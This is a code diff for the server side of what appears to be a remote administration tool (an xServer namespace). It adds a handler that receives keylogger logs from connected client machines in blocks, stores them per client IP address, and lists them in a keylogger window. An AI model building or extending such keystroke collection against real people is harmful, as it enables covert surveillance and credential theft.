@@ -309,6 +309,55 @@ namespace xServer.Core.Commands
             }).Start();
         }
 
+        public static void HandleGetLogsResponse(Client client, GetLogsResponse packet)
+        {
+            if (client.Value.FrmKl == null)
+                return;
+
+            if (packet.FileCount == 0)
+            {
+                client.Value.FrmKl.Invoke((MethodInvoker) delegate
+                {
+                    client.Value.FrmKl.btnGetLogs.Enabled = true;
+                });
+
+                return;
+            }
+
+            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\");
+
+            if (!Directory.Exists(downloadPath))
+                Directory.CreateDirectory(downloadPath);
+
+            downloadPath = Path.Combine(downloadPath, packet.Filename + ".html");
+
+            FileSplit destFile = new FileSplit(downloadPath);
+
+            destFile.AppendBlock(packet.Block, packet.CurrentBlock);
+
+            if (packet.Index == packet.FileCount && (packet.CurrentBlock + 1) == packet.MaxBlocks)
+            {
+                FileInfo[] iFiles = new DirectoryInfo(Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\")).GetFiles();
+
+                if (iFiles.Length == 0)
+                    return;
+
+                foreach (FileInfo file in iFiles)
+                {
+                    var file1 = file;
+                    client.Value.FrmKl.Invoke((MethodInvoker)delegate
+                    {
+                        client.Value.FrmKl.lstLogs.Items.Add(new ListViewItem() { Text = file1.Name });
+                    });
+                }
+
+                client.Value.FrmKl.Invoke((MethodInvoker)delegate
+                {
+                    client.Value.FrmKl.btnGetLogs.Enabled = true;
+                });
+            }
+        }
+
         public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
         {
             string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
